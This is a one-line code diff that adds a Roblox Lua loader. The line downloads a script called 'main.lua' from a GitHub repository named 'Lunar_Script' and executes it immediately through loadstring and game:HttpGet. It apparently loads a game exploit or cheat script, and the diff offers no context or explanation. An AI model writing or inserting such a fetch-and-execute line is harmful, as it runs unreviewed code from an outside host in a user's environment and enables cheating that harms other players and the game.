@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/Fatality-Wins-FW/Lunar_Script/raw/refs/heads/main/main.lua"))()
